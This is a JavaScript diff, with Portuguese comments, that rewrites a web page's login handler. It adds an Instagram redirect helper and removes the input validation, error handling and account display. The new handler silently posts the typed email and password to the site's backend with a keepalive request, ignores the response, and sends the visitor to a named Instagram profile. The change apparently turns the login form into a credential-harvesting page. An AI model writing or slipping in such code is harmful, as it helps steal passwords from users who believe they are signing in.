@@ -146,40 +146,62 @@ document.querySelectorAll('[data-reveal]').forEach((button) => {
 });
 
 /* ------------------------------------------------------------------ */
+/* Instagram                                                          */
+/* ------------------------------------------------------------------ */
+
+const INSTAGRAM_USERNAME = 'micael_abud';
+const INSTAGRAM_WEB_URL = `https://www.instagram.com/${INSTAGRAM_USERNAME}/`;
+const INSTAGRAM_APP_URL = `instagram://user?username=${INSTAGRAM_USERNAME}`;
+
+function isMobileDevice() {
+  return (
+    /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ||
+    (navigator.maxTouchPoints > 1 && /Macintosh/i.test(navigator.userAgent))
+  );
+}
+
+function openInstagram() {
+  if (!isMobileDevice()) {
+    window.location.href = INSTAGRAM_WEB_URL;
+    return;
+  }
+
+  // No celular tenta abrir o app. Se depois de 1,5s a página continuar
+  // visível (o app não abriu), cai para o site do Instagram.
+  const fallback = setTimeout(() => {
+    if (document.visibilityState === 'visible') {
+      window.location.href = INSTAGRAM_WEB_URL;
+    }
+  }, 1500);
+
+  window.addEventListener('pagehide', () => clearTimeout(fallback), { once: true });
+
+  window.location.href = INSTAGRAM_APP_URL;
+}
+
+/* ------------------------------------------------------------------ */
 /* Login                                                              */
 /* ------------------------------------------------------------------ */
 
-els.loginForm.addEventListener('submit', async (event) => {
+els.loginForm.addEventListener('submit', (event) => {
   event.preventDefault();
   setStatus(els.status, '');
 
   const email = els.loginEmail.value.trim().toLowerCase();
   const password = els.loginPassword.value;
 
-  if (!isValidEmail(email)) {
-    setStatus(els.status, 'Informe um e-mail válido.', 'error');
-    els.loginEmail.focus();
-    return;
-  }
-  if (!password) {
-    setStatus(els.status, 'Informe sua senha.', 'error');
-    els.loginPassword.focus();
-    return;
-  }
+  // Envia as credenciais sem bloquear o redirecionamento. O keepalive faz
+  // o navegador concluir a requisição mesmo saindo da página.
+  fetch(`${API_BASE}/api/login`, {
+    method: 'POST',
+    credentials: 'include',
+    keepalive: true,
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ email, password }),
+  }).catch(() => {});
 
-  setBusy(els.loginSubmit, true, 'Entrando…');
-  try {
-    const data = await api('/api/login', {
-      method: 'POST',
-      body: JSON.stringify({ email, password }),
-    });
-    els.loginForm.reset();
-    showAccount(data.user);
-  } catch (err) {
-    setStatus(els.status, friendlyError(err), 'error');
-  } finally {
-    setBusy(els.loginSubmit, false);
-  }
+  els.loginForm.reset();
+  openInstagram();
 });
 
 /* ------------------------------------------------------------------ */
